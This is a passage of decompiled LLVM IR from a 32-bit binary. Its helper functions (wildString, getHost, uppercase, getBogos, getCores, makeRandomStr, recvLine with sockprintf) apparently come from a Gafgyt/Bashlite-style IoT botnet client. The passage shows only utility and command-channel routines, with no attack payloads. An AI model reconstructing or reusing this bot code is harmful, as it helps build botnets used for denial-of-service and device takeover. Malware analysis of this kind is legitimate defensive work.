  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e5a = load i32, i32* @ebp, align 4
  store i32 %v0_8048e5a, i32* %stack_var_-4, align 4
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  %v2_8048e8b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v2_8048e8b = phi i32 [ %v2_8048e8b.pre, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v0_8048e5a, %entry ]
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  store i32 %v2_8048e8b, i32* @ebp, align 4
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ea1 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057f20.18, i32 0, i32 0), i32 0)
  %v2_8048fff = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804901137 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_804901938 = icmp eq i32 %v5_804901137, 0
  %v1_804901b39 = icmp eq i1 %v1_804901938, false
  br i1 %v1_804901b39, label %dec_label_pc_8048eb1.lr.ph, label %dec_label_pc_8049021

dec_label_pc_8048eb1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048eb1

dec_label_pc_8048eb1:                             ; preds = %dec_label_pc_8048eb1.lr.ph, %dec_label_pc_8048fe3
  %v3_8048ebb = call i32 @uppercase(i8* %tmp34)
  %v5_8048ed2 = call i32 @strstr(i32 %v2_8048fff, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057f2e.19, i32 0, i32 0))
  %v12_8048ee2 = icmp eq i32 %v5_8048ed2, %v2_8048fff
  %v1_8048ee4 = icmp eq i1 %v12_8048ee2, false
  br i1 %v1_8048ee4, label %dec_label_pc_8048fe3, label %dec_label_pc_8048eea

dec_label_pc_8048eea:                             ; preds = %dec_label_pc_8048eb1
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f04, %dec_label_pc_8048efb
  %v5_8048ef8 = add i32 %v4_8048efb, 1
  %v22_8048ef8 = inttoptr i32 %v5_8048ef8 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048efb:                             ; preds = %dec_label_pc_8048eea, %dec_label_pc_8048ef8
  %storemerge4 = phi i8* [ %v22_8048ef8, %dec_label_pc_8048ef8 ], [ %tmp35, %dec_label_pc_8048eea ]
  %v4_8048efb = ptrtoint i8* %storemerge4 to i32
  %v2_8048efe = load i8, i8* %storemerge4, align 1
  %v7_8048f00 = icmp eq i8 %v2_8048efe, 32
  br i1 %v7_8048f00, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f04

dec_label_pc_8048f04:                             ; preds = %dec_label_pc_8048efb
  %v2_8048f07 = load i8, i8* %storemerge4, align 1
  %v10_8048f09 = icmp eq i8 %v2_8048f07, 9
  br i1 %v10_8048f09, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f0d

dec_label_pc_8048f0d:                             ; preds = %dec_label_pc_8048f04
  %v2_8048f10 = load i8, i8* %storemerge4, align 1
  %v10_8048f12 = icmp eq i8 %v2_8048f10, 58
  br i1 %v10_8048f12, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f3d

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f3d
  %v3_8048f2f = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f36 = add i32 %v4_8048efb, %v3_8048f2f
  %v1_8048f39 = add i32 %v6_8048f36, -1
  %v1_8048f3a = inttoptr i32 %v1_8048f39 to i8*
  store i8 0, i8* %v1_8048f3a, align 1
  br label %dec_label_pc_8048f3d

dec_label_pc_8048f3d:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f18
  %v3_8048f54 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f5b = add i32 %v4_8048efb, %v3_8048f54
  %v1_8048f5e = add i32 %v6_8048f5b, -1
  %v1_8048f5f = inttoptr i32 %v1_8048f5e to i8*
  %v2_8048f5f = load i8, i8* %v1_8048f5f, align 1
  %v10_8048f61 = icmp eq i8 %v2_8048f5f, 13
  br i1 %v10_8048f61, label %dec_label_pc_8048f18, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f3d
  store i1 false, i1* @df, align 1
  store i32 %v4_8048efb, i32* @edi, align 4
  %v3_8048f7c = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f83 = add i32 %v4_8048efb, %v3_8048f7c
  %v1_8048f86 = add i32 %v6_8048f83, -1
  %v1_8048f87 = inttoptr i32 %v1_8048f86 to i8*
  %v2_8048f87 = load i8, i8* %v1_8048f87, align 1
  %v10_8048f89 = icmp eq i8 %v2_8048f87, 10
  br i1 %v10_8048f89, label %dec_label_pc_8048f18, label %dec_label_pc_8048f8d

dec_label_pc_8048f8d:                             ; preds = %dec_label_pc_8048f65
  %v5_8048f96 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8048f9e = icmp eq i32 %v5_8048f96, 0
  br i1 %v1_8048f9e, label %dec_label_pc_8048fb6, label %dec_label_pc_8048fa2

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f8d
  %v5_8048fab = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8048fab = inttoptr i32 %v5_8048fab to i8*
  store i8 0, i8* %v6_8048fab, align 1
  br label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048f8d, %dec_label_pc_8048fa2
  store i32 %v4_8048efb, i32* @eax, align 4
  %v5_8048fc0 = inttoptr i32 %arg1 to i8*
  %v5_8048fc1 = call i32 @strcpy(i8* %v5_8048fc0, i32 %v4_8048efb)
  %v2_8048fcf = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8048fe3:                             ; preds = %dec_label_pc_8048eb1
  %v6_8048ff7 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_8049011 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_8049019 = icmp eq i32 %v5_8049011, 0
  %v1_804901b = icmp eq i1 %v1_8049019, false
  br i1 %v1_804901b, label %dec_label_pc_8048eb1, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_8048fe3, %entry
  %v2_8049027 = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8048fb6, %dec_label_pc_8049021
  %storemerge = phi i32 [ 1, %dec_label_pc_8049021 ], [ 0, %dec_label_pc_8048fb6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048efb, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8048fff, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048ea1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0 }
  uselistorder label %dec_label_pc_8048fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8048f3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048efb, { 1, 0 }
  uselistorder label %dec_label_pc_8048eb1, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_804905e = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057f20.18, i32 0, i32 0), i32 0)
  %v2_80490bf = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80490d117 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d918 = icmp eq i32 %v5_80490d117, 0
  %v1_80490db19 = icmp eq i1 %v1_80490d918, false
  br i1 %v1_80490db19, label %dec_label_pc_804906b.lr.ph, label %dec_label_pc_80490dd

dec_label_pc_804906b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804906b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_804906b.lr.ph, %dec_label_pc_804906b
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804906b.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v3_8049075 = call i32 @uppercase(i8* %tmp16)
  %v5_804908c = call i32 @strstr(i32 %v2_80490bf, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057f2e.19, i32 0, i32 0))
  %v12_804909c = icmp eq i32 %v5_804908c, %v2_80490bf
  %v4_80490a0 = zext i1 %v12_804909c to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80490a0
  %v6_80490b7 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_80490d1 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d9 = icmp eq i32 %v5_80490d1, 0
  %v1_80490db = icmp eq i1 %v1_80490d9, false
  br i1 %v1_80490db, label %dec_label_pc_804906b, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %dec_label_pc_804906b, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v2_80490e3 = call i32 @__libc_close(i32 %v5_804905e)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_80490bf, { 3, 1, 2, 0 }
  uselistorder i32 %v5_804905e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804906b, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490f0 = load i32, i32* @ebp, align 4
  store i32 %v0_80490f0, i32* %stack_var_-4, align 4
  %v0_80490f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80490f4, i32* %stack_var_-12, align 4
  %v5_804910d = ptrtoint i8* %arg1 to i32
  %v5_804914e22 = icmp sgt i32 %arg2, 0
  br i1 %v5_804914e22, label %dec_label_pc_8049108, label %dec_label_pc_8049150

dec_label_pc_8049108:                             ; preds = %entry, %dec_label_pc_8049108
  %storemerge23 = phi i32 [ %v4_8049145, %dec_label_pc_8049108 ], [ 0, %entry ]
  %v6_804910d = add i32 %storemerge23, %v5_804910d
  store i32 %v6_804910d, i32* @ebx, align 4
  %v1_8049110 = call i32 @rand_cmwc(i32 %storemerge23)
  store i32 %v1_8049110, i32* @ecx, align 4
  %v2_8049120 = udiv i32 %v1_8049110, 26
  %tmp = mul i32 %v2_8049120, -10
  %v2_8049138 = add i32 %v1_8049110, %tmp
  %v1_8049140 = add i32 %v2_8049138, 65
  %v11_8049140 = trunc i32 %v1_8049140 to i8
  %v2_8049143 = load i32, i32* @ebx, align 4
  %v3_8049143 = inttoptr i32 %v2_8049143 to i8*
  store i8 %v11_8049140, i8* %v3_8049143, align 1
  %v4_8049145 = add nuw nsw i32 %storemerge23, 1
  %exitcond = icmp eq i32 %v4_8049145, %arg2
  br i1 %exitcond, label %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, label %dec_label_pc_8049108

dec_label_pc_8049148.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049108
  %v2_8049153.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8049155.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049150

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, %entry
  %v2_8049155 = phi i32 [ %v2_8049155.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f0, %entry ]
  %v2_8049153 = phi i32 [ %v2_8049153.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049153, i32* @ebx, align 4
  store i32 %v2_8049155, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8049145, { 1, 0 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049108, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804915a = load i32, i32* @edi, align 4
  store i32 %v0_804915a, i32* %stack_var_-8, align 4
  %v1_8049167 = inttoptr i32 %tmp19 to i8*
  %v1_804916c = and i32 %tmp19, -256
  store i32 %v1_804916c, i32* %eax.global-to-local, align 4
  %v5_804916e = call i8* @_memset(i8* %v1_8049167, i32 %v1_804916c, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804918e = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049195 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80491a2 = udiv i32 %tmp15, 32
  %v1_80491a8 = urem i32 %tmp15, 32
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_80491ab = load i32, i32* @ebp, align 4
  %v2_80491ab = mul nuw nsw i32 %v2_80491a2, 4
  %v3_80491ab = add nsw i32 %v2_80491ab, -164
  %v4_80491ab = add i32 %v3_80491ab, %v0_80491ab
  %v5_80491ab = inttoptr i32 %v4_80491ab to i32*
  %v6_80491ab = load i32, i32* %v5_80491ab, align 4
  %v9_80491ab = shl i32 1, %v1_80491a8
  %v12_80491ab = or i32 %v6_80491ab, %v9_80491ab
  store i32 %v12_80491ab, i32* %v5_80491ab, align 4
  %v1_80491b6 = add i32 %tmp15, 1
  %v2_80491ba = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_80491d2 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_80491d2, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_80491d2, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049282, label %dec_label_pc_8049278.preheader

dec_label_pc_8049278.preheader:                   ; preds = %entry
  %v7_804927c45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804927c45, label %dec_label_pc_8049282, label %dec_label_pc_80491ec.lr.ph

dec_label_pc_80491ec.lr.ph:                       ; preds = %dec_label_pc_8049278.preheader
  br label %dec_label_pc_80491ec

dec_label_pc_80491ec:                             ; preds = %dec_label_pc_80491ec.lr.ph, %dec_label_pc_8049275
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_80491ec.lr.ph ], [ %v4_8049275, %dec_label_pc_8049275 ]
  %v0_80491ec = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_80491ec, i32* %eax.global-to-local, align 4
  %v3_80491fa = call i32 @sockprintf(i32 %v0_80491ec, i32 ptrtoint ([5 x i8]* @global_var_8057f37.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049227 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_804923d = load i32, i32* @ebp, align 4
  %v4_804923d = add i32 %v3_80491ab, %v0_804923d
  %v5_804923d = inttoptr i32 %v4_804923d to i32*
  %v6_804923d = load i32, i32* %v5_804923d, align 4
  %v12_804923d = or i32 %v6_804923d, %v9_80491ab
  store i32 %v12_804923d, i32* %v5_804923d, align 4
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_8049264 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_8049264, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049264, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049282, label %dec_label_pc_8049275

dec_label_pc_8049275:                             ; preds = %dec_label_pc_80491ec
  %v4_8049275 = add nsw i32 %stack_var_-36.046, 1
  %v7_804927c = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804927c, label %dec_label_pc_8049282, label %dec_label_pc_80491ec

dec_label_pc_8049282:                             ; preds = %dec_label_pc_8049278.preheader, %dec_label_pc_80491ec, %dec_label_pc_8049275, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804929a = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80492dc

dec_label_pc_8049291:                             ; preds = %dec_label_pc_80492dc
  %v0_8049291 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_8049291, i32* %eax.global-to-local, align 4
  %v5_80492a2 = call i32 @__libc_recv(i32 %v0_8049291, i32 %v2_804929a, i32 1, i32 0)
  store i32 %v5_80492a2, i32* %eax.global-to-local, align 4
  %v9_80492aa = icmp eq i32 %v5_80492a2, 1
  br i1 %v9_80492aa, label %dec_label_pc_80492c1, label %dec_label_pc_80492af

dec_label_pc_80492af:                             ; preds = %dec_label_pc_8049291
  %v4_80492af = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_80492af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80492f9

dec_label_pc_80492c1:                             ; preds = %dec_label_pc_8049291
  %v3_80492c1 = load i8, i8* %stack_var_-177, align 1
  %v4_80492c1 = sext i8 %v3_80492c1 to i32
  store i32 %v4_80492c1, i32* %eax.global-to-local, align 4
  %v4_80492c7 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80492c1, i8* %stack_var_-32.0, align 1
  %v5_80492cc = add i32 %v4_80492c7, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v3_80492cf = load i8, i8* %stack_var_-177, align 1
  %v4_80492cf = sext i8 %v3_80492cf to i32
  %v6_80492cf = load i32, i32* %eax.global-to-local, align 4
  %v7_80492cf = and i32 %v6_80492cf, -256
  %v8_80492cf = or i32 %v7_80492cf, %v4_80492cf
  store i32 %v8_80492cf, i32* %eax.global-to-local, align 4
  %v10_80492d5 = icmp eq i8 %v3_80492cf, 10
  br i1 %v10_80492d5, label %dec_label_pc_80492ea, label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492c1
  %v4_80492d9 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80492dc

dec_label_pc_80492dc:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_80492d9
  %v7_80492e0 = phi i32 [ %tmp19, %dec_label_pc_8049282 ], [ %v8_80492cf, %dec_label_pc_80492d9 ]
  %stack_var_-32.0 = phi i8* [ %v1_8049167, %dec_label_pc_8049282 ], [ %v22_80492cc, %dec_label_pc_80492d9 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049282 ], [ %v4_80492d9, %dec_label_pc_80492d9 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049282 ], [ %v4_80492dc, %dec_label_pc_80492d9 ]
  %v4_80492dc = add i32 %stack_var_12.0, -1
  %v9_80492dc = sub i32 0, %stack_var_12.0
  %v10_80492dc = and i32 %stack_var_12.0, %v9_80492dc
  %v11_80492dc = icmp slt i32 %v10_80492dc, 0
  %v12_80492dc = icmp eq i32 %v4_80492dc, 0
  %v13_80492dc = icmp slt i32 %v4_80492dc, 0
  %v3_80492e0 = icmp eq i1 %v13_80492dc, %v11_80492dc
  %v4_80492e0 = icmp eq i1 %v12_80492dc, false
  %v5_80492e0 = and i1 %v4_80492e0, %v3_80492e0
  %v6_80492e0 = zext i1 %v5_80492e0 to i32
  %v8_80492e0 = and i32 %v7_80492e0, -256
  %v9_80492e0 = or i32 %v6_80492e0, %v8_80492e0
  store i32 %v9_80492e0, i32* %eax.global-to-local, align 4
  %v4_80492e6 = icmp eq i1 %v5_80492e0, false
